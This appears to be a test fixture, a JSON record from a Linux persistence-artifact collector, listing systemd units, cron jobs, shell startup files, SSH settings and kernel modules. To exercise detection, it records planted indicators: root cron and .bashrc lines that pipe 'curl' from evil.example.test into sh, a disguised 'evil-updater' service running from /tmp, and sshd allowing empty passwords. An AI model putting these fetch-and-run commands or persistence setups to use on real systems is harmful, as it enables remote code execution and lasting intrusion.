@@ -1,0 +1,246 @@
+{
+  "artifact": "persistence",
+  "collected_at": "2026-03-10T12:00:00Z",
+  "errors": [],
+  "notes": [],
+  "records": [
+    {
+      "collection_status": "ok",
+      "description": "Nightly backup",
+      "exec_all": [
+        "ExecStart=/usr/local/bin/missing-backup.sh"
+      ],
+      "exec_binary": "/usr/local/bin/missing-backup.sh",
+      "exec_exists": false,
+      "exec_start": [
+        "/usr/local/bin/missing-backup.sh"
+      ],
+      "gid": 0,
+      "kind": "systemd_unit",
+      "mode": "0644",
+      "mtime": "2026-02-25T06:13:20Z",
+      "owner": "root",
+      "path": "/etc/systemd/system/backup.service",
+      "restart": null,
+      "scope": "system",
+      "sha256": "906f68c91e2fe56e5330c63a890cd7ab9ace77ee489dc9dacbd6c0f4a28ef219",
+      "size": 124,
+      "timer_schedule": [],
+      "timer_unit": null,
+      "type": null,
+      "uid": 0,
+      "unit": "backup.service",
+      "unit_type": "service",
+      "user": null,
+      "wanted_by": [
+        "multi-user.target"
+      ],
+      "world_readable": true,
+      "world_writable": false
+    },
+    {
+      "collection_status": "ok",
+      "description": "System Update Helper",
+      "exec_all": [
+        "ExecStart=/tmp/.cache/kworker-upd --daemon"
+      ],
+      "exec_binary": "/tmp/.cache/kworker-upd",
+      "exec_exists": true,
+      "exec_sha256": "ac42db2b771c6400dd73ea1072446ea2af0719b733c12c0907ad76c85c0a4cce",
+      "exec_start": [
+        "/tmp/.cache/kworker-upd --daemon"
+      ],
+      "gid": 0,
+      "kind": "systemd_unit",
+      "mode": "0644",
+      "mtime": "2026-02-25T06:13:20Z",
+      "owner": "root",
+      "path": "/etc/systemd/system/evil-updater.service",
+      "restart": "always",
+      "scope": "system",
+      "sha256": "9d36247b177785c6a761d0a2833e38461f0a2c9796443f16c34730b1541155a5",
+      "size": 145,
+      "timer_schedule": [],
+      "timer_unit": null,
+      "type": null,
+      "uid": 0,
+      "unit": "evil-updater.service",
+      "unit_type": "service",
+      "user": null,
+      "wanted_by": [
+        "multi-user.target"
+      ],
+      "world_readable": true,
+      "world_writable": false
+    },
+    {
+      "kind": "systemd_enablement",
+      "path": "/etc/systemd/system/multi-user.target.wants/evil-updater.service",
+      "scope": "system",
+      "symlink_target": "/etc/systemd/system/evil-updater.service",
+      "target_unit": "multi-user.target.wants",
+      "unit": "evil-updater.service"
+    },
+    {
+      "collection_status": "ok",
+      "description": "OpenBSD Secure Shell server",
+      "exec_all": [
+        "ExecStart=/usr/sbin/sshd -D"
+      ],
+      "exec_binary": "/usr/sbin/sshd",
+      "exec_exists": true,
+      "exec_sha256": "c8a17e6b2a54f45f2a51b4dc470651ca0d49f8bb90b4ec3ce7a036fbf7abeab7",
+      "exec_start": [
+        "/usr/sbin/sshd -D"
+      ],
+      "gid": 0,
+      "kind": "systemd_unit",
+      "mode": "0644",
+      "mtime": "2026-02-25T06:13:20Z",
+      "owner": "root",
+      "path": "/etc/systemd/system/ssh.service",
+      "restart": null,
+      "scope": "system",
+      "sha256": "c3dbe88d11c661815ccd745b66384445f537025075b11cbd023a848c3c8af42d",
+      "size": 122,
+      "timer_schedule": [],
+      "timer_unit": null,
+      "type": null,
+      "uid": 0,
+      "unit": "ssh.service",
+      "unit_type": "service",
+      "user": null,
+      "wanted_by": [
+        "multi-user.target"
+      ],
+      "world_readable": true,
+      "world_writable": false
+    },
+    {
+      "command": "cd / && run-parts --report /etc/cron.hourly",
+      "exec_binary": "cd",
+      "exec_exists": null,
+      "file_sha256": "b548d9badd343ff8fa1c4195c631cc80d3bc280f61d10eeb479d166e32ca5fcf",
+      "kind": "cron_entry",
+      "line_no": 3,
+      "mode": "0644",
+      "mtime": "2026-02-25T06:13:20Z",
+      "owner": "root",
+      "path": "/etc/crontab",
+      "schedule": "17 * * * *",
+      "user": "root"
+    },
+    {
+      "command": "curl -s http://evil.example.test/p.sh | sh",
+      "exec_binary": "curl",
+      "exec_exists": null,
+      "file_sha256": "b548d9badd343ff8fa1c4195c631cc80d3bc280f61d10eeb479d166e32ca5fcf",
+      "kind": "cron_entry",
+      "line_no": 4,
+      "mode": "0644",
+      "mtime": "2026-02-25T06:13:20Z",
+      "owner": "root",
+      "path": "/etc/crontab",
+      "schedule": "*/5 * * * *",
+      "user": "root"
+    },
+    {
+      "command": "/usr/sbin/sshd -t",
+      "exec_binary": "/usr/sbin/sshd",
+      "exec_exists": true,
+      "file_sha256": "11c171635818eb26644a028d75e60dc0a31a2fe7163f5654e502b3bc88cb0f55",
+      "kind": "cron_entry",
+      "line_no": 1,
+      "mode": "0644",
+      "mtime": "2026-02-25T06:13:20Z",
+      "owner": "root",
+      "path": "/etc/cron.d/cleanup",
+      "schedule": "0 3 * * *",
+      "user": "root"
+    },
+    {
+      "collection_status": "ok",
+      "commands": [
+        "alias ll='ls -l'",
+        "curl http://evil.example.test/x.sh | sh"
+      ],
+      "gid": 0,
+      "kind": "shell_startup",
+      "mode": "0644",
+      "mtime": "2026-02-25T06:13:20Z",
+      "owner": "root",
+      "path": "/home/analyst/.bashrc",
+      "sha256": "890248911df90b3c5db20c42217506b7d716acfaa7e02b1f3e9a660e09bb726c",
+      "size": 87,
+      "type": "file",
+      "uid": 0,
+      "world_readable": true,
+      "world_writable": false
+    },
+    {
+      "collection_status": "ok",
+      "gid": 0,
+      "kind": "sshd_config",
+      "mode": "0644",
+      "mtime": "2026-02-25T06:13:20Z",
+      "owner": "root",
+      "path": "/etc/ssh/sshd_config",
+      "settings": {
+        "passwordauthentication": "yes",
+        "permitemptypasswords": "yes",
+        "port": "22"
+      },
+      "sha256": "b298935a91fa0ba548b53fcf9d0285d19c439cf13a1cbc706fa1b5a77dc26d92",
+      "size": 60,
+      "type": "file",
+      "uid": 0,
+      "world_readable": true,
+      "world_writable": false
+    },
+    {
+      "collection_status": "ok",
+      "gid": 0,
+      "has_command_option": true,
+      "key_count": 1,
+      "keys": [
+        {
+          "fingerprint": "SHA256:+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU",
+          "has_command_option": true,
+          "has_from_option": false,
+          "type": "ssh-ed25519"
+        }
+      ],
+      "kind": "authorized_keys",
+      "mode": "0600",
+      "mtime": "2026-02-25T06:13:20Z",
+      "owner": "root",
+      "path": "/home/analyst/.ssh/authorized_keys",
+      "size": 119,
+      "type": "file",
+      "uid": 0,
+      "world_readable": false,
+      "world_writable": false
+    },
+    {
+      "kind": "kernel_module",
+      "name": "nf_tables",
+      "size": 262144,
+      "used_by": "-"
+    },
+    {
+      "kind": "kernel_module",
+      "name": "synthetic_mod",
+      "size": 16384,
+      "used_by": "-"
+    }
+  ],
+  "schema_version": 1,
+  "sources": [
+    "/etc/systemd/system",
+    "/etc/systemd/system/multi-user.target.wants",
+    "/run/systemd/system",
+    "/etc/cron.d",
+    "/proc/modules"
+  ],
+  "status": "ok"
+}
